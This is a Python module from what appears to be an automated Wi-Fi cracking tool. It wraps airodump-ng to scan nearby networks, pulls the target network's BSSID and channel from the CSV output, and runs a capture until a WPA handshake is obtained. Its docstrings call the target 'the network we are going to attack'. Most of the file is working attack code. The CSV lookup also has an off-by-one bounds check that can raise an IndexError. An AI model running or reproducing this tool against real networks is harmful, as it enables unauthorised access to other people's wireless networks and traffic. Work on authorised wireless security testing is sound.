import subprocess
import time
import csv
import sys

from common_functions import write_log

from .aircrack import Aircrack

class Airodump:
    """Class for airodump-ng methods"""

    def capture_available_networks(self, monitor_interface: str, time_capturing: int = 120):
        """During 'time_capturing' parameter, capture all reachable networks to get the information about the network we are going to attack.

        Args:
            monitor_interface (str): interface name set in monitor mode.
            time_capturing (int, optional): Seconds capturing reachable networks. Defaults to 120.

        Returns:
            str: returns the file name where networks information is stored.
        """
        
        networks_file_name = 'networks'
        networks_file_path = f'src/files/{networks_file_name}'
        command = ['airodump-ng', '--output-format', 'csv', '-w', networks_file_path, monitor_interface]
        try:
            subprocess.run(command, capture_output=True, text=True, timeout=time_capturing)
            
        except subprocess.TimeoutExpired:
            write_log('[+] Reachable networks captured')
        
        except subprocess.CalledProcessError as e:
            write_log(f'[!] Failed to execute airodump-ng. Command: {" ".join(command)}. Error: {e.stderr}')
            sys.exit(1)
            
        return networks_file_name

            
    def capture_handshake(self, monitor_interface: str, network_ssid: str, captured_networks_file_name: str):
        """Method who manages the capture of handshake.

        Args:
            monitor_interface (str): interface name set in monitor mode.
            network_ssid (str): target network name.
            captured_networks_file_name (str): file name where networks information is stored.

        Returns:
            str: returns the file name where the handshake is stored.
        """
        
        network_bssid = self.get_network_field_from_csv(network_ssid, 'bssid', captured_networks_file_name)
        network_channel = self.get_network_field_from_csv(network_ssid, 'channel', captured_networks_file_name)
        
        if not network_bssid or not network_channel:
            write_log(f'[!] Network with SSID {network_ssid} not found')
            sys.exit(1)
            
        captured_handshake_file_name = f'{network_ssid}-handshake'
        
        command = ['airodump-ng', '-c', network_channel, '--bssid', network_bssid, '-w', f'src/files/{captured_handshake_file_name}', '--output-format', 'pcap', monitor_interface]
        try:
            process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        except subprocess.CalledProcessError:
            write_log(f'[!] Failed to execute airodump-ng. Command: {" ".join(command)}')
            sys.exit(1)
        
        aircrack: Aircrack = Aircrack()
        handshake_captured = False
        while not handshake_captured:
            handshake_captured = aircrack.check_captured_handshake(captured_handshake_file_name)
            # time.sleep(120) PRODUCTION
            time.sleep(15)
            
        process.terminate()
        try:
            process.wait(10)
        except Exception:
            process.kill()
            
        write_log(f'[+] Handshake for network {network_ssid} captured')
        
        return captured_handshake_file_name


    def get_network_field_from_csv(self, network_name: str, field: str, file_name: str):
        """Get network field with the name 'field' passed through parameter. This information is searched in the file exported by function 'capture_available_networks()'.

        Args:
            network_name (str): target network name.
            field (str): field name searched.
            file_name (str): file name where networks information is stored.

        Returns:
            str | None: returns the value of the field if exists. Otherwise returns None.
        """
        
        try:
            fields = {
                'bssid': 0,
                'channel': 3
            }
            with open(f'src/files/{file_name}-01.csv', newline='') as f:
                reader = csv.reader(f)
                for row in reader:
                    if row and len(row) >= 13 and row[13].strip() == network_name:  # row[13] -> ESSID
                        return row[fields.get(field)].strip()
            
            return None
        
        except FileNotFoundError:
            write_log(f'[!] File with name {file_name} not found as an airodump-ng output file')
            return None
        